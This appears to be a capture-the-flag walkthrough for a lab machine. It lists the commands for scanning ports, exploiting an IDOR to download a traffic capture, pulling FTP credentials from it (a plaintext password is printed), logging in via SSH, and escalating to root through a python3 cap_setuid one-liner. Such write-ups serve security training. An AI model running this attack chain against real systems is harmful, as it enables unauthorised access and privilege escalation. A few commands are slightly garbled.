### 1. Port Scanning and Service Reconnaissance (Reconnaissance Phase)

Finding open ports and determining service versions using a basic Nmap (Network Mapper) scan:

```text
nmap -sC -sV -p- <MACHINE_IP>
```

---
### 2. Web Application Exploitation and Data Interception (IDOR Phase)

Downloading a network traffic dump through the IDOR (Insecure Direct Object Reference) vulnerability by spoofing the number in the link to /data/0:

```text
wget http://<MACHINE_IP>/data/0 -O 0.pcap
```

---
### 3. Network Traffic Analysis and Password Extraction (PCAP Analysis Phase)

Quickly searching for clear credentials inside a PCAP (Packet Capture) file from an FTP (File Transfer) service Protocol):

```text
strings 0.pcap | grep -i "user\|pass"
```

Detailed traffic parsing using the tshark command-line utility to filter authorization requests:

```text
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

---
### 4. Gaining initial access (User Stage)

Connecting to the server via SSH (Secure Shell) using the found login/password pair (nathan / Buck3tH0und#ar3di3):

```text
ssh nathan@<MACHINE_IP>
```

Reading the first user flag in the home directory:

```text
cat user.txt
```

---
### 5. Searching for vectors for privilege escalation (Stage PrivEsc)

Search for binaries with incorrectly configured Capabilities (Linux Capabilities) that allow bypassing access restrictions:

```text
getcap -r /2>/dev/null
```

---
### 6. Exploiting a vulnerable binary and taking over the system (Root Stage)

Elevating privileges to superuser via the found /usr/bin/python3.8 (which has cap_setuid) by changing the UID (User Identifier) ​​to 0:

```text
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Checking current permissions and reading the main administrator flag:

```text
whoami && cat /root/root.txt
```
